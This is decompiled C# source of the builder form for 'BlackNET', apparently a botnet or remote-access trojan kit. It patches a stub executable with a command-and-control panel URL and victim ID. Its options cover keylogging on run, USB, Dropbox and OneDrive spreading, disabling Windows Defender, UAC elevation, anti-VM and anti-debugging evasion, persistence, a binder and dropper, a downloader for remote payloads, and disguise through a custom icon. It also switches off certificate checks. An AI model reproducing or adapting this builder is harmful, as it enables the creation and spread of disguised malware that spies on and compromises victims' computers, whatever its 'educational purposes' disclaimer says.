        if (this._CheckForUpdate != null)
          this._CheckForUpdate.Click -= eventHandler;
        this._CheckForUpdate = value;
        if (this._CheckForUpdate == null)
          return;
        this._CheckForUpdate.Click += eventHandler;
      }
    }

    internal virtual NSTextBox ExecutionDelayTime
    {
      get => this._ExecutionDelayTime;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._ExecutionDelayTime = value;
    }

    internal virtual NSLabel NsLabel9
    {
      get => this._NsLabel9;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._NsLabel9 = value;
    }

    internal virtual NSCheckBox DelayExecution
    {
      get => this._DelayExecution;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._DelayExecution = value;
    }

    internal virtual NSButton GenerateSleep
    {
      get => this._GenerateSleep;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.GenerateSleep_Click);
        if (this._GenerateSleep != null)
          this._GenerateSleep.Click -= eventHandler;
        this._GenerateSleep = value;
        if (this._GenerateSleep == null)
          return;
        this._GenerateSleep.Click += eventHandler;
      }
    }

    internal virtual NSCheckBox CriticalProcess
    {
      get => this._CriticalProcess;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._CriticalProcess = value;
    }

    internal virtual NSComboBox ClientExt
    {
      get => this._ClientExt;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._ClientExt = value;
    }

    internal virtual NSCheckBox DisableWD
    {
      get => this._DisableWD;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._DisableWD = value;
    }

    internal virtual NSRadioButton Startup
    {
      get => this._Startup;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Startup = value;
    }

    internal virtual NSRadioButton SchTask
    {
      get => this._SchTask;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._SchTask = value;
    }

    internal virtual NSButton GenerateID
    {
      get => this._GenerateID;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.GenerateID_Click);
        if (this._GenerateID != null)
          this._GenerateID.Click -= eventHandler;
        this._GenerateID = value;
        if (this._GenerateID == null)
          return;
        this._GenerateID.Click += eventHandler;
      }
    }

    internal virtual NSCheckBox KeyloggerOnRun
    {
      get => this._KeyloggerOnRun;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._KeyloggerOnRun = value;
    }

    public void AddIcons() => this.AddIconsThread();

    private void Main_Load(object sender, EventArgs e)
    {
      List<NSComboBox> nsComboBoxList = new List<NSComboBox>();
      nsComboBoxList.Add(this.InstallPath);
      nsComboBoxList.Add(this.DroperPath);
      nsComboBoxList.Add(this.DownloadPath);
      nsComboBoxList.Add(this.ClientExt);
      try
      {
        foreach (NSComboBox nsComboBox in nsComboBoxList)
          nsComboBox.SelectedItem = RuntimeHelpers.GetObjectValue(nsComboBox.Items[0]);
      }
      finally
      {
        List<NSComboBox>.Enumerator enumerator;
        enumerator.Dispose();
      }
      if (Operators.CompareString(MySettingsProperty.Settings.PanelURL, "", false) != 0)
      {
        this.PanelURL.Text = MySettingsProperty.Settings.PanelURL;
        this.VictimID.Text = MySettingsProperty.Settings.VictimID;
        this.MUTEX.Text = MySettingsProperty.Settings.MUTEX;
        this.DataSplitter.Text = MySettingsProperty.Settings.Splitter;
        this.FileName.Text = MySettingsProperty.Settings.Filename;
        this.Startup.Checked = MySettingsProperty.Settings.Startup;
        this.AntiDebugging.Checked = MySettingsProperty.Settings.AntiDebug;
        this.ElevateUAC.Checked = MySettingsProperty.Settings.UAC;
        this.USBSpread.Checked = MySettingsProperty.Settings.USB;
        this.StealthMode.Checked = MySettingsProperty.Settings.Stealth;
        this.Watchdog.Checked = MySettingsProperty.Settings.Watchdog;
        this.DropboxSpread.Checked = MySettingsProperty.Settings.DropBox;
        this.OnedriveSpread.Checked = MySettingsProperty.Settings.OneDrive;
        this.DebugMode.Checked = MySettingsProperty.Settings.OneDrive;
        this.SchTask.Checked = MySettingsProperty.Settings.Schtask;
        this.BypassVM.Checked = MySettingsProperty.Settings.VM;
      }
      new Thread(new ThreadStart(this.LoadImages))
      {
        IsBackground = true
      }.Start();
      if (this.IconListView.Items.Count <= 0)
        new Thread(new ThreadStart(this.AddIcons))
        {
          IsBackground = true
        }.Start();
      Control.CheckForIllegalCrossThreadCalls = false;
    }

    private void LoadImages()
    {
      string[] files = this.files;
      int index = 0;
      while (index < files.Length)
      {
        string filename = files[index];
        if (filename.EndsWith(".ico"))
          this.IconList.Images.Add(Image.FromFile(filename));
        checked { ++index; }
      }
    }

    private void CompileClient_Click(object sender, EventArgs e)
    {
      if (!System.IO.File.Exists(Path.Combine(Application.StartupPath, "stub.exe")))
      {
        int num1 = (int) Interaction.MsgBox((object) "Stub Not Found.", MsgBoxStyle.Critical);
      }
      else if (Operators.CompareString(this.PanelURL.Text, "", false) == 0)
      {
        int num2 = (int) Interaction.MsgBox((object) "Please Enter Your BlackNET Panel URL.", MsgBoxStyle.Critical);
      }
      else
      {
        AssemblyDefinition assemblyDefinition = AssemblyDefinition.ReadAssembly(Path.Combine(Application.StartupPath, "stub.exe"));
        try
        {
          foreach (ModuleDefinition module in assemblyDefinition.Modules)
          {
            try
            {
              foreach (TypeDefinition type in module.Types)
              {
                try
                {
                  foreach (MethodDefinition method in type.Methods)
                  {
                    if (method.IsConstructor)
                    {
                      if (method.HasBody)
                      {
                        try
                        {
                          IEnumerator<Instruction> enumerator = (IEnumerator<Instruction>) method.Body.Instructions.GetEnumerator();
                          while (((IEnumerator) enumerator).MoveNext())
                          {
                            Instruction current = enumerator.Current;
                            OpCode opCode = current.OpCode;
                            if (((OpCode) ref opCode).Code == 113 & current.Operand != null)
                            {
                              string Left = current.Operand.ToString();
                              if (Operators.CompareString(Left, "[HOST]", false) == 0)
                              {
                                current.Operand = !this.EnableAES.Checked ? (object) this.PanelURL.Text : (object) this.AES_Encrypt(this.PanelURL.Text, this.EncryptionKey.ToString());
                              }
                              else
                              {
                                if (Operators.CompareString(Left, "[ID]", false) == 0)
                                  current.Operand = (object) this.VictimID.Text;
                                if (Operators.CompareString(Left, "[StartupName]", false) == 0)
                                  current.Operand = (object) Main.getMD5Hash(System.IO.File.ReadAllBytes(Path.Combine(Application.StartupPath, "stub.exe")));
                                if (Operators.CompareString(Left, "[MUTEX]", false) == 0)
                                  current.Operand = (object) string.Format("BN[{0}]", (object) this.MUTEX.Value.ToLower());
                                if (Operators.CompareString(Left, "[Splitter]", false) == 0)
                                  current.Operand = (object) this.DataSplitter.Text;
                                if (Operators.CompareString(Left, "[Watcher_Status]", false) == 0)
                                {
                                  current.Operand = (object) this.Watchdog.Checked.ToString();
                                  if (this.Watchdog.Checked)
                                  {
                                    FileInfo fileInfo = new FileInfo("watcher.exe");
                                    EmbeddedResource embeddedResource = new EmbeddedResource(fileInfo.Name, (ManifestResourceAttributes) 2, System.IO.File.ReadAllBytes(fileInfo.FullName));
                                    assemblyDefinition.MainModule.Resources.Add((Resource) embeddedResource);
                                  }
                                }
                                if (Operators.CompareString(Left, "[Install_Path]", false) == 0)
                                  current.Operand = (object) this.InstallPath.Text;
                                if (Operators.CompareString(Left, "[Install_Name]", false) == 0)
                                  current.Operand = (object) this.FileName.Text;
                                if (Operators.CompareString(Left, "[Startup]", false) == 0)
                                  current.Operand = (object) this.Startup.Checked.ToString();
                                if (Operators.CompareString(Left, "[KeyloggerOnRun]", false) == 0)
                                  current.Operand = (object) this.KeyloggerOnRun.Checked.ToString();
                                if (Operators.CompareString(Left, "[BypassSCP]", false) == 0)
                                  current.Operand = (object) this.AntiDebugging.Checked.ToString();
                                if (Operators.CompareString(Left, "[AntiVM]", false) == 0)
                                  current.Operand = (object) this.BypassVM.Checked.ToString();
                                if (Operators.CompareString(Left, "[HardInstall]", false) == 0)
                                  current.Operand = (object) this.StealthMode.Checked.ToString();
                                if (Operators.CompareString(Left, "[USBSpread]", false) == 0)
                                  current.Operand = (object) this.USBSpread.Checked.ToString();
                                if (Operators.CompareString(Left, "[AESKey]", false) == 0)
                                  current.Operand = (object) this.EncryptionKey.ToString();
                                if (Operators.CompareString(Left, "[EncStatus]", false) == 0)
                                  current.Operand = (object) this.EnableAES.Checked.ToString();
                                if (Operators.CompareString(Left, "[Added_SchTask]", false) == 0)
                                  current.Operand = (object) this.SchTask.Checked.ToString();
                                if (Operators.CompareString(Left, "[DropboxSpread]", false) == 0)
                                  current.Operand = (object) this.DropboxSpread.Checked.ToString();
                                if (Operators.CompareString(Left, "[OneDriveSpread]", false) == 0)
                                  current.Operand = (object) this.OnedriveSpread.Checked.ToString();
                                if (Operators.CompareString(Left, "[ElevateUAC]", false) == 0)
                                  current.Operand = (object) this.ElevateUAC.Checked.ToString();
                                if (Operators.CompareString(Left, "[DisableWD]", false) == 0)
                                  current.Operand = (object) this.DisableWD.Checked.ToString();
                                if (Operators.CompareString(Left, "[CriticalProcess]", false) == 0)
                                  current.Operand = (object) this.CriticalProcess.Checked.ToString();
                                if (Operators.CompareString(Left, "[DebugMode]", false) == 0)
                                  current.Operand = (object) this.DebugMode.Checked.ToString();
                                if (Operators.CompareString(Left, "[DelayBool]", false) == 0)
                                  current.Operand = (object) this.DelayExecution.Checked.ToString();
                                if (Operators.CompareString(Left, "[SleepTime]", false) == 0)
                                  current.Operand = (object) this.ExecutionDelayTime.Text;
                                if (Operators.CompareString(Left, "[BinderStatus]", false) == 0)
                                {
                                  current.Operand = (object) this.EnableBinder.Checked.ToString();
                                  if (this.EnableBinder.Checked)
                                  {
                                    NSListView.NSListViewItem[] items = this.FilesPaths.Items;
                                    int index = 0;
                                    while (index < items.Length)
                                    {
                                      NSListView.NSListViewItem nsListViewItem = items[index];
                                      EmbeddedResource embeddedResource = new EmbeddedResource(new FileInfo(nsListViewItem.Text).Name, (ManifestResourceAttributes) 2, System.IO.File.ReadAllBytes(nsListViewItem.Text));
                                      assemblyDefinition.MainModule.Resources.Add((Resource) embeddedResource);
                                      checked { ++index; }
                                    }
                                  }
                                }
                                if (this.EnableBinder.Checked)
                                {
                                  if (Operators.CompareString(Left, "[DropperPath]", false) == 0)
                                    current.Operand = (object) this.DroperPath.SelectedItem.ToString();
                                }
                                else if (Operators.CompareString(Left, "[DropperPath]", false) == 0)
                                  current.Operand = (object) "";
                                if (Operators.CompareString(Left, "[DownloaderStatus]", false) == 0)
                                {
                                  current.Operand = (object) this.EnableDownloader.Checked.ToString();
                                  if (this.EnableDownloader.Checked && ((IEnumerable<NSListView.NSListViewItem>) this.DownloadLinksView.Items).Count<NSListView.NSListViewItem>() > 0)
                                  {
                                    string s = "";
                                    NSListView.NSListViewItem[] items = this.DownloadLinksView.Items;
                                    int index = 0;
                                    while (index < items.Length)
                                    {
                                      NSListView.NSListViewItem nsListViewItem = items[index];
                                      s = s + nsListViewItem.Text + ",";
                                      checked { ++index; }
                                    }
                                    EmbeddedResource embeddedResource = new EmbeddedResource("Downloader", (ManifestResourceAttributes) 2, Encoding.UTF8.GetBytes(this.ENB(ref s)));
                                    assemblyDefinition.MainModule.Resources.Add((Resource) embeddedResource);
                                  }
                                }
                                if (this.EnableDownloader.Checked)
                                {
                                  if (Operators.CompareString(Left, "[DownloaderPath]", false) == 0)
                                    current.Operand = (object) this.DownloadPath.SelectedItem.ToString();
                                }
                                else if (Operators.CompareString(Left, "[DownloaderPath]", false) == 0)
                                  current.Operand = (object) "";
                              }
                            }
                          }
                        }
                        finally
                        {
                        }
                      }
                    }
                  }
                }
                finally
                {
                  Collection<MethodDefinition>.Enumerator enumerator;
                  enumerator.Dispose();
                }
              }
            }
            finally
            {
              Collection<TypeDefinition>.Enumerator enumerator;
              enumerator.Dispose();
            }
          }
        }
        finally
        {
          Collection<ModuleDefinition>.Enumerator enumerator;
          enumerator.Dispose();
        }
        SaveFileDialog dialog = this.dialog;
        string[] strArray = this.ClientExt.SelectedItem.ToString().Split(' ');
        dialog.InitialDirectory = Application.StartupPath;
        dialog.FileName = "Client" + strArray[0].ToLower();
        dialog.Filter = "Executable Applications (*" + strArray[0].ToLower() + ")|*" + strArray[0].ToLower();
        dialog.Title = "Choose a place to save your bot | BlackNET v" + this.ProductVersion;
        if (this.dialog.ShowDialog() != DialogResult.OK)
          return;
        assemblyDefinition.Write(this.dialog.FileName);
        if (this.CustomIcon.Checked && Operators.CompareString(this.IconName, "", false) != 0)
          IconChanger.InjectIcon(this.dialog.FileName, "icons\\" + this.IconName + ".ico");
        if (this.CustomIconFromFile.Checked && Operators.CompareString(this.IconPath.Text, "", false) != 0)
          IconChanger.InjectIcon(this.dialog.FileName, "icons\\" + new FileInfo(this.IconPath.Text).Name);
        int num3 = (int) Interaction.MsgBox((object) "Your Client Has Been Compiled.", MsgBoxStyle.Information, (object) "Done !");
      }
    }

    public static string getMD5Hash(byte[] B)
    {
      B = new MD5CryptoServiceProvider().ComputeHash(B);
      string md5Hash = "";
      byte[] numArray = B;
      int index = 0;
      while (index < numArray.Length)
      {
        byte num = numArray[index];
        md5Hash += num.ToString("x2");
        checked { ++index; }
      }
      return md5Hash;
    }

    public string Randomisi2(int lenght, string charc)
    {
      VBMath.Randomize();
      StringBuilder stringBuilder = new StringBuilder("");
      char[] charArray = charc.ToCharArray();
      int num1 = lenght;
      int num2 = 1;
      while (num2 <= num1)
      {
        VBMath.Randomize();
        int index = checked ((int) Math.Round((double) unchecked (Conversion.Int((float) checked (charArray.Length - 2 - 0 + 1) * VBMath.Rnd()) + 1f)));
        stringBuilder.Append(charArray[index]);
        checked { ++num2; }
      }
      return stringBuilder.ToString();
    }

    public string AES_Encrypt(string plainText, string secretKey)
    {
      byte[] array;
      using (MemoryStream memoryStream = new MemoryStream())
      {
        RijndaelManaged algorithm = this.getAlgorithm(secretKey);
        using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, algorithm.CreateEncryptor(), CryptoStreamMode.Write))
        {
          byte[] bytes = Encoding.Unicode.GetBytes(plainText);
          cryptoStream.Write(bytes, 0, bytes.Length);
          cryptoStream.FlushFinalBlock();
          array = memoryStream.ToArray();
        }
      }
      return Convert.ToBase64String(array);
    }

    private RijndaelManaged getAlgorithm(string secretKey)
    {
      string s = "vtzh8iRo6puxnQpZHCoMBqGSyyj2zZfw9uejNzwpKH8y284imD35gsmUeAXle1DNOMSAsBcrqINQGbsk";
      Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(secretKey, Encoding.Unicode.GetBytes(s));
      RijndaelManaged algorithm = new RijndaelManaged();
      algorithm.KeySize = 256;
      algorithm.IV = rfc2898DeriveBytes.GetBytes(checked ((int) Math.Round(unchecked ((double) algorithm.BlockSize / 8.0))));
      algorithm.Key = rfc2898DeriveBytes.GetBytes(checked ((int) Math.Round(unchecked ((double) algorithm.KeySize / 8.0))));
      algorithm.Padding = PaddingMode.PKCS7;
      return algorithm;
    }

    public object check_panel(string Panel)
    {
      object obj;
      try
      {
        bool flag;
        if (Operators.ConditionalCompareObjectEqual(this.IsAccessable(Panel), (object) true, false))
          flag = this.IsPanel(Panel);
        obj = (object) flag;
      }
      catch (WebException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        obj = (object) false;
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    public bool IsPanel(string PanelURL)
    {
      bool flag1;
      try
      {
        bool flag2;
        if (Operators.ConditionalCompareObjectEqual(this.IsAccessable(PanelURL), (object) true, false))
        {
          string Left = Conversions.ToString(this._GET(PanelURL + "/check_panel.php"));
          flag2 = Operators.CompareString(Left, bool.TrueString, false) == 0 | Operators.CompareString(Left, bool.FalseString, false) == 0 && bool.Parse(Left);
        }
        flag1 = flag2;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag1 = false;
        ProjectData.ClearProjectError();
      }
      return flag1;
    }

    private object IsAccessable(string PanelURL)
    {
      Uri requestUri = new Uri(PanelURL);
      ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(this.AcceptAllCertifications);
      ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
      WebRequest webRequest1 = WebRequest.Create(requestUri);
      WebRequest webRequest2;
      object obj;
      try
      {
        webRequest1.GetResponse().Close();
        webRequest2 = (WebRequest) null;
        obj = (object) true;
      }
      catch (WebException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        webRequest2 = (WebRequest) null;
        obj = (object) false;
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    public object _GET(string Panel)
    {
      object obj;
      try
      {
        Uri requestUri = new Uri(Panel);
        ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(this.AcceptAllCertifications);
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
        HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(requestUri);
        httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36";
        httpWebRequest.Method = "GET";
        HttpWebResponse response = (HttpWebResponse) httpWebRequest.GetResponse();
        string end = new StreamReader(response.GetResponseStream()).ReadToEnd();
        response.Close();
        obj = (object) end;
      }
      catch (WebException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        obj = (object) false;
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    public bool AcceptAllCertifications(
      object sender,
      X509Certificate certification,
      X509Chain chain,
      SslPolicyErrors sslPolicyErrors)
    {
      return true;
    }

    private void EnableAES_CheckedChanged(object sender)
    {
      if (this.EnableAES.Checked)
      {
        StringBuilder encryptionKey = this.EncryptionKey;
        string s = this.Randomisi2(50, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789!@#$%^&*");
        string str = this.ENB(ref s);
        encryptionKey.Append(str);
      }
      else
        this.EncryptionKey.Clear();
    }

    public string ENB(ref string s) => Convert.ToBase64String(Encoding.UTF8.GetBytes(s)).Split('=')[0].Replace("+", "-").Replace("/", "_");

    private void CheckForUpdate_Click(object sender, EventArgs e)
    {
      try
      {
        WebClient webClient1 = new WebClient();
        WebClient webClient2 = new WebClient();
        string productVersion = this.ProductVersion;
        ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(this.AcceptAllCertifications);
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
        string str = webClient1.DownloadString("https://raw.githubusercontent.com/FarisCode511/BlackNET/main/version.txt");
        if (int.Parse(productVersion.Replace(".", (string) null)) >= int.Parse(str.Replace("v", (string) null).Replace(".", (string) null)))
        {
          int num1 = (int) MessageBox.Show("BlackNET is Up to Date.", "Update check", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        }
        else
        {
          if (MessageBox.Show("New update is available,\r\nDo you want to download it", "Update check", MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) != DialogResult.Yes)
            return;
          webClient2.DownloadFile("https://github.com/FarisCode511/BlackNET/archive/main.zip", "BlackNET - " + str + ".zip");
          int num2 = (int) MessageBox.Show("Update has been downloaded please extract it", "Update check", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        }
      }
      catch (WebException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        int num = (int) Interaction.MsgBox((object) ex.Message, MsgBoxStyle.Critical, (object) "Error");
        ProjectData.ClearProjectError();
      }
    }

    private void CheckPanel_Click(object sender, EventArgs e)
    {
      if (Conversions.ToBoolean(this.check_panel(this.PanelURL.Text)))
      {
        int num1 = (int) MessageBox.Show("Your Panel is Enabled.", "Panel Status", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
      }
      else
      {
        int num2 = (int) MessageBox.Show("Your Panel is Disabled or Does not Exist.", "Panel Status", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
    }

    private void AddLink_Click(object sender, EventArgs e)
    {
      string str = Interaction.InputBox("Please Enter a Direct Link", "Add a Link");
      if (Operators.CompareString(str, "", false) == 0)
        return;
      this.DownloadLinksView.AddItem(str);
    }

    private void AddIconFromFile_Click(object sender, EventArgs e)
    {
      OpenFileDialog a = this.a;
      a.Filter = "icon File (*.ico)|*.ico";
      a.Title = "Select Icon";
      if (a.ShowDialog() == DialogResult.OK)
        this.IconPath.Text = this.a.FileName;
    }

    private void AddFile_Click(object sender, EventArgs e)
    {
      OpenFileDialog f = this.f;
      f.Title = "Please Select a File";
      f.Filter = "Files (*.*)|*.*";
      if (f.ShowDialog() == DialogResult.OK)
        this.FilesPaths.AddItem(this.f.FileName);
    }

    private void DeleteFile_Click(object sender, EventArgs e)
    {
      if (this.FilesPaths.SelectedItems.Length < 1)
        return;
      this.FilesPaths.RemoveItems(this.FilesPaths.SelectedItems);
    }

    private void DeleteLink_Click(object sender, EventArgs e)
    {
      if (this.DownloadLinksView.SelectedItems.Length < 1)
        return;
      this.DownloadLinksView.RemoveItems(this.DownloadLinksView.SelectedItems);
    }

    private void PoweredBy_DoubleClick(object sender, EventArgs e)
    {
      int num = (int) MessageBox.Show("BlackNET v" + this.ProductVersion + "\r\n\r\nThx to: NYANxCAT, KFC, 0xfd, LimerBoy and Amadeus\r\n\r\nCopyright (c) Black.Hacker - " + Conversions.ToString(DateTime.UtcNow.Year) + "\r\n\r\nThis Project is for educational purposes only.\r\n\r\nThis Project is Licensed under MIT", "About BlackNET", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
    }

    private void CloseSoftware_Click(object sender, EventArgs e)
    {
      if (MessageBox.Show("Do you want to save your current settings?", "Close", MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) == DialogResult.Yes)
      {
        MySettingsProperty.Settings.PanelURL = this.PanelURL.Text;
        MySettingsProperty.Settings.VictimID = this.VictimID.Text;
        MySettingsProperty.Settings.MUTEX = this.MUTEX.Text;
        MySettingsProperty.Settings.Splitter = this.DataSplitter.Text;
        MySettingsProperty.Settings.Filename = this.FileName.Text;
        MySettingsProperty.Settings.Startup = this.Startup.Checked;
        MySettingsProperty.Settings.AntiDebug = this.AntiDebugging.Checked;
        MySettingsProperty.Settings.UAC = this.ElevateUAC.Checked;
        MySettingsProperty.Settings.USB = this.USBSpread.Checked;
        MySettingsProperty.Settings.Stealth = this.StealthMode.Checked;
        MySettingsProperty.Settings.Watchdog = this.Watchdog.Checked;
        MySettingsProperty.Settings.DropBox = this.DropboxSpread.Checked;
        MySettingsProperty.Settings.OneDrive = this.OnedriveSpread.Checked;
        MySettingsProperty.Settings.USB = this.OnedriveSpread.Checked;
        MySettingsProperty.Settings.USB = this.DebugMode.Checked;
        MySettingsProperty.Settings.Schtask = this.SchTask.Checked;
        MySettingsProperty.Settings.VM = this.BypassVM.Checked;
        MySettingsProperty.Settings.Save();
      }
      else
        MySettingsProperty.Settings.Reset();
    }

    private void GenerateSleep_Click(object sender, EventArgs e) => this.ExecutionDelayTime.Text = this.Randomisi2(4, "123456789");

    private void StealthMode_CheckedChanged(object sender)
    {
      switch (this.StealthMode.Checked)
      {
        case false:
          this.InstallPath.Enabled = false;
          this.FileName.Enabled = false;
          break;
        case true:
          this.InstallPath.Enabled = true;
          this.FileName.Enabled = true;
          break;
      }
    }

    private void IconListView_SelectedIndexChanged(object sender, EventArgs e)
    {
      try
      {
        foreach (ListViewItem selectedItem in this.IconListView.SelectedItems)
          this.IconName = selectedItem.Text;
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }

    private void GenerateID_Click(object sender, EventArgs e) => this.VictimID.Text = this.Randomisi2(6, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz123456789");

    private void AddIconsThread()
    {
      try
      {
        this.BeginInvoke((Delegate) new Main.AddIconsThreadDelegate(this.AddIconsThreadSub));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void AddIconsThreadSub()
    {
      try
      {
        int imageIndex = 0;
        string[] files = this.files;
        int index = 0;
        while (index < files.Length)
        {
          string str = files[index];
          if (str.EndsWith(".ico"))
          {
            this.IconListView.Items.Add(str.Split('\\')[1].Split('.')[0], imageIndex);
            checked { ++imageIndex; }
          }
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void EnableBinder_CheckedChanged(object sender)
    {
      if (this.EnableBinder.Checked)
      {
        this.FilesPaths.Enabled = true;
        this.DroperPath.Enabled = true;
        this.AddFile.Enabled = true;
        this.DeleteFile.Enabled = true;
      }
      else
      {
        this.FilesPaths.Enabled = false;
        this.DroperPath.Enabled = false;
        this.AddFile.Enabled = false;
        this.DeleteFile.Enabled = false;
      }
    }

    private void EnableDownloader_CheckedChanged(object sender)
    {
      if (this.EnableDownloader.Checked)
      {
        this.DownloadLinksView.Enabled = true;
        this.DownloadPath.Enabled = true;
        this.AddLink.Enabled = true;
        this.DeleteLink.Enabled = true;
      }
      else
      {
        this.DownloadLinksView.Enabled = false;
        this.DownloadPath.Enabled = false;
        this.AddLink.Enabled = false;
        this.DeleteLink.Enabled = false;
      }
    }

    private delegate void AddIconsThreadDelegate();
  }
}
